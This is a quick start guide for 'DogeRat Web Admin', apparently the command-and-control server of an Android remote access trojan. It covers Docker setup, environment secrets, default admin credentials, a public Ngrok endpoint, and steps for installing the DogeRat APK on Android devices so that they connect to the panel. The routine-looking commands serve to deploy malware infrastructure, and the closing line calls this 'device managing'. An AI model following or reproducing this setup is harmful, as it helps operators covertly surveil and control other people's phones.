# DogeRat Web Admin v2.0 - Quick Start Guide

Get DogeRat Web Admin running in **5 minutes** with this step-by-step guide.

---

## 🚀 Prerequisites

Before you begin, ensure you have:

- ✅ **Docker & Docker Compose** installed ([Get Docker](https://docs.docker.com/get-docker/))
- ✅ **Git** installed
- ✅ 4GB+ RAM available
- ✅ Ports 80, 5000, 5432, 4040 available

**Optional (for development)**:

- Node.js 20+ and npm
- PostgreSQL 15+ (if not using Docker)

---

## 📦 Installation

### Step 1: Clone Repository

```bash
git clone https://github.com/hoanganh-hue/rat-androi.git
cd rat-androi
```

### Step 2: Configure Environment

```bash
# Copy example environment file
cp .env.example .env

# Edit .env with your preferred text editor
nano .env  # or vim, code, etc.
```

**Important settings to change**:

```bash
# Change these for production:
JWT_SECRET=your-very-long-random-secret-key-here
ADMIN_PASSWORD=YourStrongPassword@123

# Optional: Configure database
DB_PASSWORD=your-secure-database-password

# Optional: Configure Ngrok (for remote access)
NGROK_AUTHTOKEN=your-ngrok-auth-token
```

**Generate a strong JWT secret**:

```bash
openssl rand -base64 64
```

### Step 3: Start with Docker

```bash
# Start all services (PostgreSQL, Backend, Frontend, Ngrok)
docker-compose up -d

# Wait 30-60 seconds for services to start
# Watch logs to see progress
docker-compose logs -f
```

**Expected output**:

```
✅ Database migrations completed
✅ Admin user created
✅ Server listening on port 5000
✅ Health check passed
```

Press `Ctrl+C` to stop watching logs.

---

## 🌐 Access the Application

### Local Access

- **Web Interface**: http://localhost
- **API Backend**: http://localhost:5000
- **API Documentation**: http://localhost:5000/api-docs
- **Ngrok Dashboard**: http://localhost:4040

### Remote Access (Ngrok)

- **Public URL**: https://evelina-duchesslike-solely.ngrok-free.dev
- Or check Ngrok dashboard at http://localhost:4040

### Default Credentials

```
Username: admin
Password: Admin@123456
```

**⚠️ IMPORTANT**: Change the admin password immediately after first login!

---

## ✅ Verify Installation

### 1. Check Services Health

```bash
# Check all containers are running
docker-compose ps

# All services should show "Up" and "healthy"

# Check backend health
curl http://localhost:5000/api/health

# Expected response:
# {
#   "status": "ok",
#   "timestamp": "2024-10-21T...",
#   "database": "connected",
#   "uptime": 123
# }
```

### 2. Test Login

```bash
# Test API login
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin@123456"}'

# Should return JWT token
```

### 3. Access Web Interface

1. Open browser: http://localhost
2. Login with admin credentials
3. You should see the dashboard

---

## 🎯 First Steps After Installation

### 1. Change Admin Password

1. Login to web interface
2. Go to User Management (Admin menu)
3. Click on admin user
4. Change password
5. Logout and login with new password

### 2. Create Additional Users (Optional)

```bash
# Using API
TOKEN="your-jwt-token-here"

curl -X POST http://localhost:5000/api/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "operator1",
    "email": "operator1@example.com",
    "password": "SecurePassword@123",
    "role": "operator"
  }'
```

Or create users via web interface (Admin > User Management).

### 3. Connect Android Device

1. Install DogeRat APK on Android device
2. Open app and configure:
   - Server URL: `http://your-server-ip:5000`
   - Or Ngrok URL: `https://evelina-duchesslike-solely.ngrok-free.dev`
3. Start connection
4. Device should appear in admin panel (Devices page)

---

## 🛠️ Common Commands

### View Logs

```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f server
docker-compose logs -f postgres
docker-compose logs -f client
```

### Restart Services

```bash
# Restart all
docker-compose restart

# Restart specific service
docker-compose restart server
```

### Stop Services

```bash
# Stop all (keeps data)
docker-compose stop

# Stop and remove containers (keeps volumes/data)
docker-compose down

# Stop and remove everything including data
docker-compose down -v
```

### Backup Database

```bash
# Create backup
docker-compose exec postgres pg_dump -U dogerat dogerat > backup.sql

# Restore backup
docker-compose exec -T postgres psql -U dogerat dogerat < backup.sql
```

### View Database

```bash
# Access PostgreSQL shell
docker-compose exec postgres psql -U dogerat dogerat

# Common queries:
SELECT * FROM users;
SELECT * FROM devices WHERE last_seen_at > NOW() - INTERVAL '1 hour';
SELECT * FROM audit_trail ORDER BY created_at DESC LIMIT 10;
```

---

## 🧪 Run Tests

```bash
# Run all tests (requires services to be running)
npm run validate

# Run backend tests
npm test

# Run E2E tests
npm run test:e2e
```

---

## 🐛 Troubleshooting

### Problem: Containers won't start

**Solution**:

```bash
# Check if ports are already in use
sudo lsof -i :80
sudo lsof -i :5000
sudo lsof -i :5432

# Stop conflicting services
sudo systemctl stop nginx
sudo systemctl stop postgresql

# Try again
docker-compose up -d
```

### Problem: Database connection failed

**Solution**:

```bash
# Check database container
docker-compose logs postgres

# Restart database
docker-compose restart postgres

# Wait for health check to pass
docker-compose ps postgres
```

### Problem: Can't login

**Solution**:

```bash
# Reset admin user
docker-compose exec server npm run db:seed

# Default credentials will be recreated:
# Username: admin
# Password: Admin@123456
```

### Problem: Device not connecting

**Solution**:

```bash
# Check server logs
docker-compose logs -f server

# Verify Socket.IO is working
curl http://localhost:5000/socket.io/

# Check firewall rules
sudo ufw status
sudo ufw allow 5000
```

### Problem: Ngrok not working

**Solution**:

```bash
# Check Ngrok container
docker-compose logs ngrok

# Verify auth token in .env
echo $NGROK_AUTHTOKEN

# Restart Ngrok
docker-compose restart ngrok

# Check Ngrok dashboard
open http://localhost:4040
```

---

## 📚 Next Steps

### Learn More

- **Full Documentation**: [All docs in repository](./docs/)
- **Testing Guide**: [TESTING_GUIDE.md](./TESTING_GUIDE.md)
- **API Documentation**: http://localhost:5000/api-docs
- **Security Guide**: [SECURITY_SUMMARY.md](./SECURITY_SUMMARY.md)
- **Deployment Guide**: [DEPLOYMENT_VALIDATION.md](./DEPLOYMENT_VALIDATION.md)

### Production Deployment

1. **Security Checklist**:
   - ✅ Change all default passwords
   - ✅ Generate strong JWT_SECRET
   - ✅ Configure CORS properly
   - ✅ Enable HTTPS
   - ✅ Set up backups
   - ✅ Configure monitoring
   - ✅ Review security settings

2. **Performance Tuning**:
   - Configure database connection pooling
   - Enable caching
   - Set up load balancer
   - Configure CDN for static assets

3. **Monitoring**:
   - Set up log aggregation
   - Configure alerts
   - Monitor resource usage
   - Track audit logs

See [HUONG_DAN_DEPLOYMENT.md](./HUONG_DAN_DEPLOYMENT.md) for detailed production deployment guide.

---

## 💡 Tips

### Development Mode

If you want to develop/modify the code:

```bash
# Install dependencies
npm install
cd client && npm install

# Start backend in dev mode
npm run dev

# Start frontend in dev mode (in another terminal)
cd client && npm start

# Backend: http://localhost:5000
# Frontend: http://localhost:4200
```

### Environment Variables

Key environment variables you might want to configure:

```bash
# Server
PORT=5000
NODE_ENV=production

# Database
DATABASE_URL=postgresql://user:pass@host:port/db
DB_TYPE=postgres

# Security
JWT_SECRET=your-secret-key
JWT_EXPIRY=24h
RATE_LIMIT_MAX_REQUESTS=100

# Features
MAX_FILE_SIZE=52428800
LOG_LEVEL=info

# Ngrok (remote access)
NGROK_AUTHTOKEN=your-token
NGROK_FIXED_DOMAIN=your-domain.ngrok-free.dev
```

### Docker Tips

```bash
# View resource usage
docker stats

# Remove unused images
docker image prune -a

# Rebuild after code changes
docker-compose up -d --build

# View service health
docker-compose ps

# Execute command in container
docker-compose exec server npm run db:migrate
```

---

## 🎉 Success!

You now have DogeRat Web Admin up and running!

**What's working**:

- ✅ Web interface at http://localhost
- ✅ API backend with documentation
- ✅ Database with admin user
- ✅ Real-time communication (Socket.IO)
- ✅ Remote access via Ngrok (optional)

**Next steps**:

1. Change admin password
2. Create additional users if needed
3. Connect Android devices
4. Explore features in web interface
5. Read documentation for advanced features

---

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/hoanganh-hue/rat-androi/issues)
- **Documentation**: [Repository docs](./docs/)
- **Security**: [SECURITY_SUMMARY.md](./SECURITY_SUMMARY.md)

---

**Happy device managing! 🚀**
